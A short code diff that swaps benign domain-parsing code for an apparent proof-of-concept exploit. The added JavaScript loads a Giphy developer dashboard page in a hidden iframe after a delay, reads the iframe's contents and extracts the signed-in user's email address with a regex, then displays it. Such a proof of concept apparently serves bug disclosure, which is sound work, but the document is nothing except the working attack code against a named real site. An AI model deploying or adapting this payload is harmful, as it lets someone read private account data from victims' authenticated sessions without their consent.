@@ -1,8 +1,12 @@
-var parsed = psl.parse('developers.giphy.com');
-console.log(parsed.domain);
-var parsed = psl.parse(location.hostname);
-console.log(parsed.domain);
-var url = "https://developers.giphy.com/dashboard";
-url = url.split("/")[2]; // Get the hostname
-var parsed = psl.parse(url); // Parse the domain
-document.getElementById("output").textContent = parsed.domain;
+setTimeout(function() {
+    var profileIframe = document.createElement('iframe');
+    profileIframe.setAttribute('src', 'https://devportal-new.giphy.com/dashboard/');
+    profileIframe.setAttribute('id', 'pi');
+    document.body.appendChild(profileIframe);
+    //Extract their email as PoC
+    profileIframe.onload = function() {
+        var d = document.getElementById('pi').contentWindow.document.body.innerHTML;
+        var matches = /value="([^"]+)" name="email"/.exec(d);
+        alert(matches[1]);
+    }
+}, 9000);
